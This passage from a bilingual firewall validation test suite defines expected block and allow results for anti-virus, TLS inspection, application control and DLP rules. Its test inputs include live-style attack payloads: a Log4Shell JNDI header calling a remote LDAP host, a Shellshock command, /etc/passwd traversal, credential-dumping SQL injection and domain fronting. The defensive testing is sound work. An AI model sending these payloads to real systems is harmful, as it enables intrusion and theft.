         http(T("XSS hacia el servidor IPS", "XSS to the IPS server"), "BLOCK", "http://" + S + XSS, explain=T("Perfil Prevent.", "Prevent profile."), blade="IPS", roles=["ids_clients"], needs=["roles.ids_target"]),
         http(T("Log4Shell hacia el destino IDS", "Log4Shell to the IDS target"), "ALLOW", "http://{ENV:ids_target}/", ["-H", "X-Api-Version: ${jndi:ldap://198.51.100.7/a}"], explain=T("Perfil Detect.", "Detect profile."), blade="IPS", roles=["ids_clients"], needs=["roles.ids_target"]),
         http(T("Log4Shell hacia el servidor IPS", "Log4Shell to the IPS server"), "BLOCK", "http://" + S + "/", ["-H", "X-Api-Version: ${jndi:ldap://198.51.100.7/a}"], explain=T("Perfil Prevent.", "Prevent profile."), blade="IPS", roles=["ids_clients"], needs=["roles.ids_target"]),
     ])

# ------------------------------------------------------------------ THR
E_AV = T("Descarga desde el servidor; Anti-Virus inspecciona ficheros en ambos sentidos y dentro de comprimidos.", "Download from the server; Anti-Virus inspects files in both directions and inside archives.")
case("THR-01", "high", T("Anti-malware sobre HTTP", "Anti-malware over HTTP"),
     T("El fichero de prueba EICAR se detecta y bloquea.", "The EICAR test file is detected and blocked."),
     T("Anti-Virus (firmas + ThreatCloud) en HTTP/HTTPS, incluidos comprimidos anidados y subidas.", "Anti-Virus (signatures + ThreatCloud) over HTTP/HTTPS including nested archives and uploads."),
     T("Anti-Virus con inspección en ambos sentidos y de archivos comprimidos.", "Anti-Virus inspecting both directions and archives."), EVI_STD, [
         http(T("EICAR (.com)", "EICAR (.com)"), "BLOCK", "http://" + S + "/demo/eicar.com", explain=E_AV, blade="Anti-Virus", **SRV),
         http(T("EICAR (.txt)", "EICAR (.txt)"), "BLOCK", "http://" + S + "/demo/eicar.txt", explain=E_AV, blade="Anti-Virus", **SRV),
         http(T("EICAR en zip", "EICAR in zip"), "BLOCK", "http://" + S + "/demo/eicar.zip", explain=E_AV, blade="Anti-Virus", **SRV),
         http(T("EICAR en zip dentro de zip", "EICAR in nested zip"), "BLOCK", "http://" + S + "/demo/eicar2.zip", explain=E_AV, blade="Anti-Virus", **SRV),
         http(T("EICAR subido en el cuerpo (POST)", "EICAR upload in request body (POST)"), "BLOCK", "http://" + S + "/upload", ["-H", "Content-Type: application/octet-stream", "--data-binary", "@/opt/testkit/samples/eicar.com"], explain=T("Subida tipo API: el fichero va en el cuerpo de la petición.", "API-style upload: the file travels in the request body."), blade="IPS / Anti-Virus", **SRV),
         http(T("Zip benigno (control)", "Benign zip (control)"), "ALLOW", "http://" + S + "/demo/benign.zip", explain=E_CTRL, blade="Anti-Virus", **SRV),
     ])
case("THR-02", "high", T("Anti-malware en HTTPS con y sin descifrado", "Anti-malware over HTTPS with and without decryption"),
     T("Se cuantifica lo que aporta la inspección TLS.", "Quantifies what TLS inspection adds."),
     T("Mismo EICAR por HTTPS al mismo servidor con dos nombres: inspect.testkit.lab (descifrado) y nodecrypt.testkit.lab (excluido).", "Same EICAR over HTTPS to the same server with two names: inspect.testkit.lab (decrypted) and nodecrypt.testkit.lab (bypassed)."),
     T("HTTPS Inspection con bypass para nodecrypt.testkit.lab y mtls.testkit.lab.", "HTTPS Inspection with bypass for nodecrypt.testkit.lab and mtls.testkit.lab."), EVI_STD, [
         http(T("EICAR por HTTP", "EICAR over HTTP"), "BLOCK", "http://" + S + "/demo/eicar.com", explain=E_AV, blade="Anti-Virus", **SRV),
         http(T("EICAR por HTTPS descifrado", "EICAR over decrypted HTTPS"), "BLOCK", f"https://{INS}/demo/eicar.com", R_INS, explain=E_TLS, blade="Anti-Virus / HTTPSi", **SRV),
         http(T("EICAR por HTTPS sin descifrar", "EICAR over non-decrypted HTTPS"), "ALLOW", f"https://{NOD}/demo/eicar.com", R_NOD, explain=T("Sin descifrado no hay visibilidad del contenido (resultado esperado).", "Without decryption there is no content visibility (expected result)."), blade="HTTPSi (bypass)", **SRV),
         http(T("EICAR desde Internet por HTTPS", "EICAR from the Internet over HTTPS"), "BLOCK", "https://secure.eicar.org/eicar.com.txt", explain=E_TLS, blade="Anti-Virus / HTTPSi"),
     ])
case("THR-03", "high", T("Ficheros benignos sin falsos positivos", "Benign files without false positives"),
     T("Ficheros limpios de varios formatos y tamaños no se bloquean.", "Clean files of several formats and sizes are not blocked."),
     T("Descargas por HTTP y HTTPS.", "Downloads over HTTP and HTTPS."), T("Ninguno.", "None."), EVI_STD,
     [http(T(f"{f} por {p.upper()}", f"{f} over {p.upper()}"), "ALLOW", (f"https://{INS}" if p == "https" else "http://" + S) + f"/demo/{f}", R_INS if p == "https" else [], explain=E_CTRL, blade="Anti-Virus", **SRV)
      for f in ["benign.pdf", "benign.docx", "benign.xlsx", "benign.png", "benign.json", "benign.csv", "benign_10m.bin"] for p in ["http", "https"]])
case("THR-05", "high", T("AV, Anti-Bot e IPS combinados", "Combined AV, Anti-Bot and IPS"),
     T("Los controles combinados no se anulan y muestran quién actuó.", "Combined controls do not cancel each other and show who acted."),
     T("Varios blades en el mismo perfil.", "Several blades in the same profile."), T("Perfil completo y HTTPS Inspection.", "Full profile and HTTPS Inspection."), EVI_STD, [
         http(T("EICAR en zip por HTTPS", "EICAR zip over HTTPS"), "BLOCK", f"https://{INS}/demo/eicar.zip", R_INS, explain=E_TLS, blade="Anti-Virus / HTTPSi", **SRV),
         http(T("SQLi por HTTPS", "SQLi over HTTPS"), "BLOCK", f"https://{INS}" + SQLI, R_INS, explain=E_TLS, blade="IPS / HTTPSi", **SRV),
         http(T("C&C por HTTP", "C&C over HTTP"), "BLOCK", AB_URL, explain=T("Anti-Bot.", "Anti-Bot."), blade="Anti-Bot"),
     ])

# ------------------------------------------------------------------ TLS
REQ_HTTPSI = T("HTTPS Inspection (outbound) con la CA de inspección distribuida a los clientes y la CA del kit como CA de confianza.", "Outbound HTTPS Inspection with the inspection CA trusted by clients and the testkit CA as a trusted CA.")
case("TLS-01", "critical", T("Inspección TLS 1.2 y 1.3", "TLS 1.2 and 1.3 inspection"),
     T("Se documenta qué versiones se inspeccionan y se bloquean patrones dentro de ellas.", "Documents which versions are inspected and blocks patterns inside them."),
     T("HTTPS Inspection inspecciona TLS 1.2 y 1.3 re-firmando con la CA de inspección.", "HTTPS Inspection inspects TLS 1.2 and 1.3 re-signing with the inspection CA."), REQ_HTTPSI, EVI_STD, [
         chk("tls_issuer", T("TLS 1.2 descifrado", "TLS 1.2 decrypted"), "INSPECTED", T("El certificado recibido lo emite la CA de inspección.", "The received certificate is issued by the inspection CA."), "HTTPSi", host=S, sni=INS, tls="1.2", **SRV),
         chk("tls_issuer", T("TLS 1.3 descifrado", "TLS 1.3 decrypted"), "INSPECTED", T("Igual con TLS 1.3.", "Same with TLS 1.3."), "HTTPSi", host=S, sni=INS, tls="1.3", **SRV),
         http(T("SQLi sobre TLS 1.2", "SQLi over TLS 1.2"), "BLOCK", f"https://{INS}" + SQLI, R_INS + ["--tlsv1.2", "--tls-max", "1.2"], explain=E_TLS, blade="IPS / HTTPSi", **SRV),
         http(T("SQLi sobre TLS 1.3", "SQLi over TLS 1.3"), "BLOCK", f"https://{INS}" + SQLI, R_INS + ["--tlsv1.3"], explain=E_TLS, blade="IPS / HTTPSi", **SRV),
         http(T("Petición limpia sobre TLS 1.3", "Clean request over TLS 1.3"), "ALLOW", f"https://{INS}/", R_INS + ["--tlsv1.3"], explain=E_CTRL, blade="HTTPSi", **SRV),
     ])
case("TLS-02", "high", T("CA de inspección y cadena de confianza", "Inspection CA and trust chain"),
     T("Solo los clientes que confían en la CA funcionan; no hay bypass encubierto.", "Only clients trusting the CA work; there is no hidden bypass."),
     T("La CA de inspección se distribuye a los clientes; un cliente sin ella recibe un error de certificado.", "The inspection CA is distributed to clients; a client without it gets a certificate error."), REQ_HTTPSI, EVI_STD, [
         chk("tls_issuer", T("Certificado sustituido en Internet", "Certificate replaced on the Internet"), "INSPECTED", T("La web llega firmada por la CA de inspección.", "The site arrives signed by the inspection CA."), "HTTPSi", host="{NET:inspected_site}", sni="{NET:inspected_site}"),
         chk("tls_verify", T("Cliente con la CA de inspección", "Client with the inspection CA"), "VALID", T("Valida con la CA de inspección en su almacén.", "Validates with the inspection CA in its store."), "HTTPSi", url="https://{NET:inspected_site}/", bundle="system"),
         chk("tls_verify", T("Cliente sin la CA de inspección", "Client without the inspection CA"), "INVALID", T("Solo CA públicas: falla.", "Public CAs only: fails."), "HTTPSi", url="https://{NET:inspected_site}/", bundle="public"),
     ])
case("TLS-03", "high", T("Certificados caducados, revocados o no confiables", "Expired, revoked or untrusted certificates"),
     T("La respuesta coincide con la política de validación y queda registrada.", "The response matches the validation policy and is logged."),
     T("HTTPS Inspection valida el certificado original y bloquea los no confiables, caducados y revocados.", "HTTPS Inspection validates the original certificate and blocks untrusted, expired and revoked ones."),
     T("HTTPS advanced settings: bloquear no confiables, caducados y revocados.", "HTTPS advanced settings: block untrusted, expired and revoked."), EVI_STD, [
         http(T("Certificado caducado", "Expired certificate"), "BLOCK", "https://expired.badssl.com/", explain=T("Validación del certificado del servidor.", "Server certificate validation."), blade="HTTPSi"),
         http(T("Certificado autofirmado", "Self-signed certificate"), "BLOCK", "https://self-signed.badssl.com/", explain=T("CA no confiable.", "Untrusted CA."), blade="HTTPSi"),
         http(T("Raíz no confiable", "Untrusted root"), "BLOCK", "https://untrusted-root.badssl.com/", explain=T("Cadena hasta una raíz desconocida.", "Chain to an unknown root."), blade="HTTPSi"),
         http(T("Certificado revocado", "Revoked certificate"), "BLOCK", "https://revoked.badssl.com/", explain=T("Revocado.", "Revoked."), blade="HTTPSi"),
         http(T("Control: certificado válido", "Control: valid certificate"), "ALLOW", "https://badssl.com/", explain=E_CTRL, blade="HTTPSi"),
     ])
case("TLS-04", "high", T("mTLS y certificate pinning", "mTLS and certificate pinning"),
     T("Las incompatibilidades se resuelven con una exclusión mínima.", "Incompatibilities are solved with a minimal bypass."),
     T("mTLS y pinning no admiten intermediario: se excluyen del descifrado solo esos FQDN.", "mTLS and pinning do not accept a man-in-the-middle: only those FQDNs are bypassed."), REQ_HTTPSI, EVI_STD, [
         http(T("mTLS con certificado de cliente (excluido)", "mTLS with client certificate (bypassed)"), "ALLOW", f"https://{MTLS}/", R_MTLS + ["--cert", "/opt/testkit/certs/client.crt", "--key", "/opt/testkit/certs/client.key"], explain=T("El servidor exige certificado de cliente.", "The server requires a client certificate."), blade="HTTPSi (bypass)", **SRV),
         chk("tls_verify", T("Pinning de CA (excluido)", "CA pinning (bypassed)"), "VALID", T("Cliente que solo confía en la CA del servicio.", "Client trusting only the service CA."), "HTTPSi (bypass)", url=f"https://{NOD}/", args=R_NOD, bundle="testkit", **SRV),
         chk("tls_verify", T("Pinning de CA (inspeccionado)", "CA pinning (inspected)"), "INVALID", T("Contra el FQDN inspeccionado falla: el pinning requiere exclusión.", "Against the inspected FQDN it fails: pinning needs a bypass."), "HTTPSi", url=f"https://{INS}/", args=R_INS, bundle="testkit", **SRV),
     ])
case("TLS-05", "critical", T("Exclusiones de descifrado por FQDN y categoría", "Decryption bypass by FQDN and category"),
     T("Solo el alcance aprobado queda sin descifrar.", "Only the approved scope is not decrypted."),
     T("Exclusiones por FQDN, por categorías sensibles (finanzas, salud, gobierno) y por la lista recomendada de Check Point.", "Bypass by FQDN, sensitive categories (finance, health, government) and the Check Point recommended list."), REQ_HTTPSI, EVI_STD, [
         chk("tls_issuer", T("FQDN excluido", "Bypassed FQDN"), "NOT_INSPECTED", T("No se descifra.", "Not decrypted."), "HTTPSi", host=S, sni=NOD, **SRV),
         chk("tls_issuer", T("FQDN inspeccionado", "Inspected FQDN"), "INSPECTED", T("Se descifra.", "Decrypted."), "HTTPSi", host=S, sni=INS, **SRV),
         chk("tls_issuer", T("Banca (categoría Financial)", "Banking (Financial category)"), "NOT_INSPECTED", T("Categoría sensible excluida.", "Sensitive category bypassed."), "HTTPSi", host="{NET:financial_site}", sni="{NET:financial_site}"),
         chk("tls_issuer", T("Web general", "General website"), "INSPECTED", T("Se descifra.", "Decrypted."), "HTTPSi", host="{NET:inspected_site}", sni="{NET:inspected_site}"),
     ])
case("TLS-06", "high", T("HTTP/2, QUIC y ECH", "HTTP/2, QUIC and ECH"),
     T("Se conoce la visibilidad efectiva y no hay bypass silencioso.", "Effective visibility is known and there is no silent bypass."),
     T("HTTP/2 se inspecciona igual que HTTP/1.1; QUIC (UDP/443) se deniega para forzar TCP inspeccionado.", "HTTP/2 is inspected like HTTP/1.1; QUIC (UDP/443) is denied to force inspected TCP."), REQ_HTTPSI, EVI_STD, [
         http(T("SQLi por HTTP/2", "SQLi over HTTP/2"), "BLOCK", f"https://{INS}" + SQLI, R_INS + ["--http2"], explain=E_TLS, blade="IPS / HTTPSi", **SRV),
         http(T("EICAR por HTTP/2", "EICAR over HTTP/2"), "BLOCK", f"https://{INS}/demo/eicar.com", R_INS + ["--http2"], explain=E_TLS, blade="Anti-Virus / HTTPSi", **SRV),
         http(T("Petición limpia por HTTP/2", "Clean request over HTTP/2"), "ALLOW", f"https://{INS}/", R_INS + ["--http2"], explain=E_CTRL, blade="HTTPSi", **SRV),
         chk("quic", T("QUIC (UDP/443) a Internet", "QUIC (UDP/443) to the Internet"), "BLOCK", T("Paquete QUIC Initial: sin respuesta.", "QUIC Initial packet: no answer."), "Firewall", host="cloudflare.com"),
     ])
case("TLS-07", "medium", T("Modo transparente y observabilidad", "Transparent mode and observability"),
     T("Se conoce el impacto sobre la IP de origen.", "The impact on the source IP is known."),
     T("Detrás de GWLB el firewall es transparente: conserva la IP original y no añade cabeceras de proxy.", "Behind GWLB the firewall is transparent: it keeps the original IP and adds no proxy headers."), REQ_HTTPSI, EVI_STD, [
         chk("echo_ip", T("IP de origen conservada (HTTPS inspeccionado)", "Source IP preserved (inspected HTTPS)"), "PRESERVED", T("El servidor devuelve la IP y cabeceras que ve.", "The server returns the IP and headers it sees."), "HTTPSi", url=f"https://{INS}/whoami", args=R_INS, **SRV),
     ])
case("TLS-08", "critical", T("Sobrecoste de la inspección TLS", "TLS inspection overhead"),
     T("Se obtiene el sobrecoste real de handshake y latencia.", "The real handshake and latency overhead is measured."),
     T("100 conexiones HTTPS nuevas con y sin descifrado al mismo servidor; se comparan percentiles.", "100 new HTTPS connections with and without decryption to the same server; percentiles are compared."), REQ_HTTPSI, EVI_STD, [
         chk("https_bench", T("Sobrecoste de HTTPS Inspection", "HTTPS Inspection overhead"), "MEASURE", T("inspect.testkit.lab frente a nodecrypt.testkit.lab.", "inspect.testkit.lab vs nodecrypt.testkit.lab."), "HTTPSi", n=100, **SRV),
     ])
case("TLS-09", "high", T("Amenazas dentro de HTTPS (este-oeste)", "Threats inside HTTPS (east-west)"),
     T("Las cargas de IPS y AV dentro de HTTPS se bloquean igual que en HTTP.", "IPS and AV payloads inside HTTPS are blocked as in HTTP."),
     T("HTTPS Inspection este-oeste devuelve la visibilidad a IPS, AV y DLP.", "East-west HTTPS Inspection restores visibility for IPS, AV and DLP."), REQ_HTTPSI, EVI_STD, [
         http(T("XSS por HTTPS", "XSS over HTTPS"), "BLOCK", f"https://{INS}" + XSS, R_INS, explain=E_TLS, blade="IPS / HTTPSi", **SRV),
         http(T("Path traversal por HTTPS", "Path traversal over HTTPS"), "BLOCK", f"https://{INS}/../../../../etc/passwd", R_INS + ["--path-as-is"], explain=E_TLS, blade="IPS / HTTPSi", **SRV),
         http(T("Log4Shell por HTTPS", "Log4Shell over HTTPS"), "BLOCK", f"https://{INS}/", R_INS + ["-H", "X-Api-Version: ${jndi:ldap://198.51.100.7/a}"], explain=E_TLS, blade="IPS / HTTPSi", **SRV),
         http(T("Shellshock por HTTPS", "Shellshock over HTTPS"), "BLOCK", f"https://{INS}/cgi-bin/status", R_INS + ["-A", '() { :; }; /bin/bash -c "id"'], explain=E_TLS, blade="IPS / HTTPSi", **SRV),
         http(T("EICAR por HTTPS", "EICAR over HTTPS"), "BLOCK", f"https://{INS}/demo/eicar.txt", R_INS, explain=E_TLS, blade="Anti-Virus / HTTPSi", **SRV),
         http(T("Petición limpia por HTTPS", "Clean request over HTTPS"), "ALLOW", f"https://{INS}/", R_INS, explain=E_CTRL, blade="HTTPSi", **SRV),
     ])
case("TLS-10", "high", T("Evasión y ofuscación sobre HTTPS", "Evasion and obfuscation over HTTPS"),
     T("Ninguna técnica permite eludir los controles.", "No technique bypasses the controls."),
     T("Con HTTPS Inspection el gateway ve el Host real, descomprime gzip, reensambla chunked/multipart y valida el protocolo por puerto.", "With HTTPS Inspection the gateway sees the real Host, decompresses gzip, reassembles chunked/multipart and validates the protocol per port."), REQ_HTTPSI, EVI_STD, [
         http(T("Domain fronting (SNI permitido, Host bloqueado)", "Domain fronting (allowed SNI, blocked Host)"), "BLOCK", "https://www.linkedin.com/", ["-H", "Host: www.facebook.com"], explain=T("Con descifrado se ve el Host real.", "With decryption the real Host is visible."), blade="App Control / HTTPSi"),
         http(T("EICAR con Content-Encoding gzip", "EICAR with Content-Encoding gzip"), "BLOCK", f"https://{INS}/demo/gz/eicar.txt", R_INS, explain=E_TLS, blade="Anti-Virus / HTTPSi", **SRV),
         http(T("EICAR subido por multipart (HTTPS)", "EICAR multipart upload (HTTPS)"), "BLOCK", f"https://{INS}/upload", R_INS + ["-F", "file=@/opt/testkit/samples/eicar.com"], explain=E_TLS, blade="Anti-Virus / HTTPSi", **SRV),
         http(T("SQLi en cuerpo chunked (HTTP/1.1 sobre TLS)", "SQLi in chunked body (HTTP/1.1 over TLS)"), "BLOCK", f"https://{INS}/login.php", R_INS + ["--http1.1", "-H", "Transfer-Encoding: chunked", "--data", "id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"], explain=E_TLS, blade="IPS / HTTPSi", **SRV),
         http(T("HTTPS a puerto no estándar (8443)", "HTTPS to non-standard port (8443)"), "BLOCK", "https://{NET:port_test_host}:8443/", explain=T("TLS fuera de 443.", "TLS outside 443."), blade="Firewall"),
         http(T("Datos de tarjeta en JSON por HTTPS", "Card data in JSON over HTTPS"), "BLOCK", f"https://{INS}/api/payments", R_INS + ["-H", "Content-Type: application/json", "--data-binary", "@/opt/testkit/samples/cards.json"], explain=E_TLS, blade="Content Awareness / HTTPSi", skip_roles=["dlp_exception_client"], **SRV),
     ])

# ------------------------------------------------------------------ APP
case("APP-01", "high", T("Control de aplicaciones independiente del puerto", "Port-independent application control"),
     T("La aplicación se identifica por protocolo y no por puerto.", "The application is identified by protocol, not by port."),
     T("App Control identifica aplicaciones en cualquier puerto y la salida solo admite HTTP/HTTPS con firma de protocolo.", "App Control identifies applications on any port and egress only allows HTTP/HTTPS with protocol signature."),
     T("Servicios HTTP/HTTPS con 'match by protocol signature' y SSH bloqueado como aplicación.", "HTTP/HTTPS services with 'match by protocol signature' and SSH blocked as an application."), EVI_STD, [
         tcp(T("SSH tcp/22 a Internet", "SSH tcp/22 to the Internet"), "BLOCK", "{NET:port_test_host}", 22, T("Puerto y aplicación no permitidos.", "Port and application not allowed.")),
         chk("banner", T("SSH por tcp/443", "SSH over tcp/443"), "BLOCK", T("SSH sobre el puerto de HTTPS (ssh.github.com).", "SSH over the HTTPS port (ssh.github.com)."), "App Control", host="ssh.github.com", port=443),
         http(T("HTTP en tcp/8080", "HTTP on tcp/8080"), "BLOCK", "http://{NET:port_test_host}:8080/", explain=T("Puerto no autorizado.", "Unauthorized port."), blade="Firewall"),
         http(T("HTTP en tcp/8443", "HTTP on tcp/8443"), "BLOCK", "http://{NET:port_test_host}:8443/", explain=T("Puerto no autorizado.", "Unauthorized port."), blade="Firewall"),
         http(T("HTTP en claro por tcp/443", "Cleartext HTTP on tcp/443"), "BLOCK", "http://{NET:port_test_host}:443/", explain=T("No es TLS: no coincide con el servicio HTTPS con firma.", "Not TLS: does not match the HTTPS service with signature."), blade="Firewall"),
         http(T("Control: HTTP en tcp/80", "Control: HTTP on tcp/80"), "ALLOW", "http://{NET:port_test_host}/", explain=E_CTRL, blade="Firewall"),
     ])
case("APP-02", "high", T("URL Filtering y App Control por categorías", "URL Filtering and App Control by category"),
     T("Categoría y acción quedan registradas.", "Category and action are logged."),
     T("URL Filtering por categorías y App Control por aplicación, en HTTP y HTTPS.", "URL Filtering by category and App Control by application, over HTTP and HTTPS."),
     T("Categorías Gambling y Anonymizer, y aplicaciones Facebook, TikTok, Dropbox y WeTransfer bloqueadas; LinkedIn permitida.", "Gambling and Anonymizer categories and Facebook, TikTok, Dropbox and WeTransfer applications blocked; LinkedIn allowed."), EVI_STD, [
         http(T("Sitio corporativo (permitido)", "Business site (allowed)"), "ALLOW", "http://{NET:allowed_business_site}/", explain=E_CTRL, blade="URL Filtering"),
         http(T("bet365 (Gambling) por HTTP", "bet365 (Gambling) over HTTP"), "BLOCK", "http://www.bet365.com/", explain=T("Categoría prohibida.", "Forbidden category."), blade="URL Filtering", warmup=True),
         http(T("pokerstars (Gambling) por HTTPS", "pokerstars (Gambling) over HTTPS"), "BLOCK", "https://www.pokerstars.com/", explain=T("Categoría prohibida.", "Forbidden category."), blade="URL Filtering / HTTPSi", warmup=True),
         http(T("hidemyass (Anonymizer)", "hidemyass (Anonymizer)"), "BLOCK", "http://www.hidemyass.com/", explain=T("Anonimizador.", "Anonymizer."), blade="URL Filtering", warmup=True),
         http(T("Facebook", "Facebook"), "BLOCK", "https://www.facebook.com/", explain=T("Aplicación bloqueada.", "Blocked application."), blade="App Control"),
         http(T("TikTok", "TikTok"), "BLOCK", "http://www.tiktok.com/", explain=T("Aplicación bloqueada.", "Blocked application."), blade="App Control"),
         http(T("Dropbox", "Dropbox"), "BLOCK", "https://www.dropbox.com/", explain=T("Compartición de ficheros.", "File sharing."), blade="App Control"),
         http(T("WeTransfer", "WeTransfer"), "BLOCK", "http://wetransfer.com/", explain=T("Compartición de ficheros.", "File sharing."), blade="App Control"),
         http(T("LinkedIn (permitida)", "LinkedIn (allowed)"), "ALLOW", "https://www.linkedin.com/", explain=E_CTRL, blade="App Control"),
     ])
case("APP-03", "high", T("URL completa frente a dominio/SNI", "Full URL vs domain/SNI"),
     T("Se demuestra cuándo se distingue la ruta del dominio.", "Shows when the path is distinguished from the domain."),
     T("Con HTTPS Inspection se ve la URL completa y se puede bloquear una ruta; sin descifrado solo el dominio.", "With HTTPS Inspection the full URL is visible and a path can be blocked; without decryption only the domain."),
     T("Sitio personalizado con la ruta bloqueada configurada (config.internet.blocked_path).", "Custom site with the configured blocked path (config.internet.blocked_path)."), EVI_STD, [
         http(T("Ruta permitida por HTTP", "Allowed path over HTTP"), "ALLOW", "http://{NET:allowed_site}/", explain=E_CTRL, blade="URL Filtering"),
         http(T("Ruta bloqueada por HTTP", "Blocked path over HTTP"), "BLOCK", "http://{NET:allowed_site}{NET:blocked_path}", explain=T("Coincide la ruta.", "Path matches."), blade="URL Filtering", needs=["internet.blocked_path"]),
         http(T("Ruta permitida por HTTPS", "Allowed path over HTTPS"), "ALLOW", "https://{NET:allowed_site}/", explain=E_CTRL, blade="URL Filtering / HTTPSi"),
         http(T("Ruta bloqueada por HTTPS", "Blocked path over HTTPS"), "BLOCK", "https://{NET:allowed_site}{NET:blocked_path}", explain=T("Solo posible con descifrado.", "Only possible with decryption."), blade="URL Filtering / HTTPSi", needs=["internet.blocked_path"]),
     ])
case("APP-04", "high", T("Filtrado independiente del DNS", "DNS-independent filtering"),
     T("Se conoce la superficie cubierta: IP directa, sin SNI, DoH y DoT.", "Covered surface is known: direct IP, no SNI, DoH and DoT."),
     T("Identificación por Host, SNI y certificado; DoH bloqueado como aplicación y DoT por puerto.", "Identification by Host, SNI and certificate; DoH blocked as an application and DoT by port."),
     T("Aplicación DoH bloqueada; solo DNS/HTTP/HTTPS en la salida.", "DoH application blocked; only DNS/HTTP/HTTPS on egress."), EVI_STD, [
         http(T("Facebook por IP con cabecera Host", "Facebook by IP with Host header"), "BLOCK", "http://{RESOLVE:www.facebook.com}/", ["-H", "Host: www.facebook.com"], explain=T("Sin consulta DNS.", "No DNS query."), blade="App Control"),
         http(T("Facebook por IP sin SNI (HTTPS)", "Facebook by IP without SNI (HTTPS)"), "BLOCK", "https://{RESOLVE:www.facebook.com}/", ["-H", "Host: www.facebook.com"], explain=T("Se clasifica por el certificado.", "Classified by the certificate."), blade="App Control / HTTPSi"),
         http(T("DNS sobre HTTPS", "DNS over HTTPS"), "BLOCK", "https://cloudflare-dns.com/dns-query?name=example.com&type=A", ["-H", "accept: application/dns-json"], explain=T("Aplicación DoH.", "DoH application."), blade="App Control"),
         tcp(T("DNS sobre TLS (tcp/853)", "DNS over TLS (tcp/853)"), "BLOCK", "1.1.1.1", 853, T("DoT por su puerto estándar.", "DoT on its standard port.")),
     ])
case("APP-07", "high", T("Conexiones salientes inesperadas", "Unexpected outbound connections"),
     T("Un servidor no puede abrir conexiones a destinos y puertos no previstos.", "A server cannot open connections to unexpected destinations and ports."),
     T("Salida denegada por defecto; cada intento queda registrado.", "Default-deny egress; every attempt is logged."), T("Capa de salida con cleanup en Drop.", "Egress layer with a Drop cleanup."), EVI_STD,
     [tcp(T(f"{n} tcp/{p} a Internet", f"{n} tcp/{p} to the Internet"), "BLOCK", "{NET:port_test_host}", p, T("Puerto no previsto hacia Internet.", "Unexpected port to the Internet.")) for n, p in [("SQL Server", 1433), ("MySQL", 3306), ("PostgreSQL", 5432), ("SMTP", 25), ("SMB", 445)]])

# ------------------------------------------------------------------ DLP
E_CA = T("Content Awareness inspecciona el contenido transferido (subida y descarga) y bloquea datos sensibles sintéticos.", "Content Awareness inspects transferred content (upload and download) and blocks synthetic sensitive data.")
REQ_CA = T("Reglas de Content Awareness (PCI, IBAN, ejecutables) entre entornos sobre HTTP y HTTPS.", "Content Awareness rules (PCI, IBAN, executables) between environments over HTTP and HTTPS.")
case("DLP-01", "medium", T("Transferencia de datos sensibles", "Sensitive data transfer"),
     T("Se detectan y bloquean patrones sensibles sintéticos.", "Synthetic sensitive patterns are detected and blocked."),
     T("Content Awareness con tipos de datos PCI e IBAN y tipo de fichero ejecutable.", "Content Awareness with PCI and IBAN data types and executable file type."), REQ_CA, EVI_STD, [
         http(T("Subida de fichero benigno", "Benign file upload"), "ALLOW", "http://" + S + "/upload", ["--data-binary", "@/opt/testkit/samples/benign.txt"], explain=E_CTRL, blade="Content Awareness", **SRV),
         http(T("Subida de tarjetas (PCI)", "Card numbers upload (PCI)"), "BLOCK", "http://" + S + "/upload", ["--data-binary", "@/opt/testkit/samples/cards.txt"], explain=E_CA, blade="Content Awareness", skip_roles=["dlp_exception_client"], **SRV),
         http(T("Subida de IBAN", "IBAN upload"), "BLOCK", "http://" + S + "/upload", ["--data-binary", "@/opt/testkit/samples/iban.txt"], explain=E_CA, blade="Content Awareness", skip_roles=["dlp_exception_client"], **SRV),
         http(T("Descarga de tarjetas (PCI)", "Card numbers download (PCI)"), "BLOCK", "http://" + S + "/demo/cards.txt", explain=E_CA, blade="Content Awareness", **SRV),
         http(T("Descarga de ejecutable", "Executable download"), "BLOCK", "http://" + S + "/demo/putty.exe", explain=T("Tipo de fichero ejecutable.", "Executable file type."), blade="Content Awareness", **SRV),
     ])
case("DLP-02", "medium", T("Excepciones DLP de alcance mínimo", "Minimal-scope DLP exceptions"),
     T("La excepción se aplica solo al activo y sentido aprobados.", "The exception applies only to the approved asset and direction."),
     T("Regla de excepción (solo subida desde dlp_exception_client al servidor) por encima de la de bloqueo.", "Exception rule (upload only, from dlp_exception_client to the server) above the blocking rule."),
     T("Rol dlp_exception_client y regla de excepción con dirección 'up'.", "dlp_exception_client role and exception rule with direction 'up'."), EVI_STD, [
         http(T("Subida PCI desde el activo exceptuado", "PCI upload from the excepted asset"), "ALLOW", "http://" + S + "/upload", ["--data-binary", "@/opt/testkit/samples/cards.txt"], explain=T("Dentro del alcance.", "In scope."), blade="Content Awareness", roles=["dlp_exception_client"], needs=["roles.dlp_exception_client"]),
         http(T("Subida PCI desde otro activo", "PCI upload from another asset"), "BLOCK", "http://" + S + "/upload", ["--data-binary", "@/opt/testkit/samples/cards.txt"], explain=T("Mismo fichero y destino desde otro activo.", "Same file and destination from another asset."), blade="Content Awareness", skip_roles=["dlp_exception_client"], needs=["roles.dlp_exception_client"], **SRV),
         http(T("Descarga PCI hacia el activo exceptuado", "PCI download to the excepted asset"), "BLOCK", "http://" + S + "/demo/cards.txt", explain=T("La excepción solo cubre la subida.", "The exception only covers uploads."), blade="Content Awareness", roles=["dlp_exception_client"], needs=["roles.dlp_exception_client"]),
     ])
case("DLP-03", "medium", T("DLP sobre tráfico cifrado y distintos tamaños", "DLP on encrypted traffic and object sizes"),
     T("Se documentan los límites por formato, cifrado y tamaño.", "Limits by format, encryption and size are documented."),
     T("Content Awareness sobre HTTPS descifrado, ficheros grandes y Office.", "Content Awareness on decrypted HTTPS, large files and Office."), REQ_CA, EVI_STD, [
         http(T("Subida PCI por HTTPS", "PCI upload over HTTPS"), "BLOCK", f"https://{INS}/upload", R_INS + ["--data-binary", "@/opt/testkit/samples/cards.txt"], explain=E_CA, blade="Content Awareness / HTTPSi", skip_roles=["dlp_exception_client"], **SRV),
         http(T("Descarga PCI por HTTPS", "PCI download over HTTPS"), "BLOCK", f"https://{INS}/demo/cards.txt", R_INS, explain=E_CA, blade="Content Awareness / HTTPSi", **SRV),
         http(T("PCI al final de un fichero de 2 MB", "PCI at the end of a 2 MB file"), "BLOCK", "http://" + S + "/demo/cards_2m.txt", explain=E_CA, blade="Content Awareness", **SRV),
         http(T("PCI dentro de un .docx", "PCI inside a .docx"), "BLOCK", "http://" + S + "/demo/cards.docx", explain=E_CA, blade="Content Awareness", **SRV),
         http(T("Ejecutable por HTTPS", "Executable over HTTPS"), "BLOCK", f"https://{INS}/demo/putty.exe", R_INS, explain=E_CA, blade="Content Awareness / HTTPSi", **SRV),
     ])

